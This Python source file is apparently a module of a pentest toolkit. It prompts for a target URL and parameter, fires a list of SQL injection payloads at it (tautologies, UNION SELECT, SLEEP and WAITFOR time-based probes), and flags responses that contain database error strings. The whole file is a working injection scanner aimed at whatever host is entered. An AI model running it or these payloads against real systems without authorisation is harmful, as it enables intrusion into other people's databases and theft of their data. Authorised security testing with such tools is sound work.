import requests
from rich.console import Console
from rich.prompt import Prompt
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import config

console = Console()

PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
    "' OR 1=1--", "' OR 1=1#", "' UNION SELECT NULL--",
    "' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
    "' AND 1=1--", "' AND 1=2--",
]

ERROR_SIGNS = [
    "sql syntax", "mysql_fetch", "you have an error in your sql",
    "warning: mysql", "unclosed quotation mark", "postgresql",
    "sqlite", "odbc", "ora-", "microsoft ole db",
]


def _test(url, param, payload, timeout):
    params = {param: payload}
    try:
        r = requests.get(url, params=params, timeout=timeout,
                         headers={"User-Agent": config.USER_AGENT})
        body = r.text.lower()
        for sign in ERROR_SIGNS:
            if sign in body:
                return ("error-based", sign, r.status_code)
        return ("sent", None, r.status_code)
    except requests.RequestException as e:
        return ("fail", str(e), None)


def run():
    url = Prompt.ask("url (e.g. http://target/page.php)")
    param = Prompt.ask("parameter name")
    timeout = float(Prompt.ask("timeout (s)", default="5.0"))

    console.print(f"[cyan]testing {len(PAYLOADS)} payloads on {param}[/cyan]")
    for p in PAYLOADS:
        status, detail, code = _test(url, param, p, timeout)
        if status == "error-based":
            console.print(f"[green][HIT] {p!r} -> {detail} (HTTP {code})[/green]")
        elif status == "fail":
            console.print(f"[red][FAIL] {p!r} -> {detail}[/red]")
        else:
            console.print(f"[yellow][OK] {p!r} -> HTTP {code}[/yellow]")
